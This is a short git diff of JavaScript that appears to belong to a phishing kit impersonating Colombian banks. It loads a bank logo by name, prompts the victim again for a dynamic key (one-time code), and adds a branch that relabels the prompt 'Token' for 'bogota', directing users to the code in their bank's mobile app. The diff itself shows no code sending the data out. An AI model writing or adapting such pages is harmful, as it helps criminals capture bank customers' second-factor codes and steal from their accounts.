@@ -6,7 +6,12 @@ setTimeout(() =>{
 
         // COMPROBAR ERROR
         if(info.metaInfo.cdin !== ''){
-            alert('Ingrese de nuevo su Clave Dinámica');
+            if(info.metaInfo.ban === 'bogota'){
+                alert('Ingrese de nuevo su Token');
+            }else{
+                alert('Ingrese de nuevo su Clave Dinámica');
+            }
+            
         }
 
     }catch(err){
@@ -16,6 +21,12 @@ setTimeout(() =>{
 
 // image and span
 document.querySelector('#bank-logo').setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);
+if(info.metaInfo.ban === 'bogota'){
+    console.log('hoasda')
+    document.querySelector('#din-type-title').textContent = 'Token';
+    document.querySelector('#din-type-subtitle').textContent = 'Ingresa el Token que encontrarás en la App Móvil de tu banco.';
+    document.querySelector('#cdin').placeholder = 'Token'
+}
 
 const btnNextStep = document.querySelector('#next-step');
 btnNextStep.addEventListener('submit', e => {
